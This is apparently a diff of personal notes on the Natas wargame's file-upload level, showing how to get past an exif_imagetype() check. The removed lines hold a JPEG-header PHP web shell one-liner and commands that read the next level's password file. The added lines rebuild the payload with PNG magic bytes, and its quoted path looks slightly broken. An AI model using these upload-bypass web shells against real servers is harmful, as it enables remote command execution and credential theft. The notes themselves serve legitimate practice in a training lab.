@@ -417,53 +417,44 @@ Content-Type: application/octet-stream
 <?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>
 ------geckoformboundarya350e529c3e67ca318234164fe44539b
 
-TADA ! :D
+
+
+
+
 
 lvl 14:
 -----------
-->
-same task but this was added :
-> For security reasons, we now only accept image files!
-->
-this time only the file verification code was changed...
-it added exif_imagetype()
-https://www.php.net/manual/en/function.exif-imagetype.php
-which added a check for magic bytes
-->
-the plan is:
-# via python create a file that will have the magic bytes
-  of a jpeg (ff d8 ff e0) ==> taken from gary keesler magic byte list
-# append to the file the payload right after
-# change the extention (via burp as last task) 
-   ==> name="filename" c6k17fzr39.jpg ==> c6k17fzr39.php 
-#
-->
-python -c 'f=open("payload", "wb");  f.write(bytes.fromhex("ffd8ffe0")); f.write("<?php system($_GET['cmd'])?>".encode()) ;f.close()'
-                                                                                                         
-file payload
-payload: JPEG image data
-                                                                                                         
-cat payload 
-����<?php system($_GET[cmd])?>
+This is the same task as lvl 13, but this type were fucked by a new security measure which enforces file 
+type validation by verifying the magic bytes using the exif_imagetype() function on the uploaded file :
 
-the ���� characters are like this because this is 
-the binary data we added in the beggining marking
-the start of an image file (ffd8ffe0 - jpeg magic bytes)
-->
-i recommend to do ls & than xxd on the php files
-that you find there to see more techniques from
-other people :)
+    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image";
 
-example ?cmd=xxd 06r1r0cxys.php
-->
-?cmd=cat /etc/natas_webpass/natas14
-->
-qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
+now to bypass this all we have to do is to push the magic bytes of an image file type unto our previous php
+file code which is currently only ASCII text file.
+
+> file aha.test && cat aha.test
+aha.test: PHP script, ASCII text
+<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>
+
+> xxd aha.test
+00000000: 3c3f 7068 7020 6563 686f 2066 696c 655f  <?php echo file_
+00000010: 6765 745f 636f 6e74 656e 7473 2822 2f65  get_contents("/e
+00000020: 7463 2f6e 6174 6173 5f77 6562 7061 7373  tc/natas_webpass
+00000030: 2f6e 6174 6173 3133 2229 3b20 3f3e 0a    /natas13"); ?>.
 
 
+now i could use a hex editor which is the most easy way but i dont want to install it on my kali so ill use python instead.
 
+> python -c 'with open("aha.test", "wb") as file: file.write(bytes.fromhex("89504E47") + "<?php echo file_get_contents(\"/etc/natas_webpass/natas13)\"); ?>".encode())'                                                                                                                                                       
 
-
+> xxd aha.test
+00000000: 8950 4e47 3c3f 7068 7020 6563 686f 2066  .PNG<?php echo f
+00000010: 696c 655f 6765 745f 636f 6e74 656e 7473  ile_get_contents
+00000020: 2822 2f65 7463 2f6e 6174 6173 5f77 6562  ("/etc/natas_web
+00000030: 7061 7373 2f6e 6174 6173 3133 2922 293b  pass/natas13)");
+00000040: 203f 3e                                   ?>
+                   
 
 
 
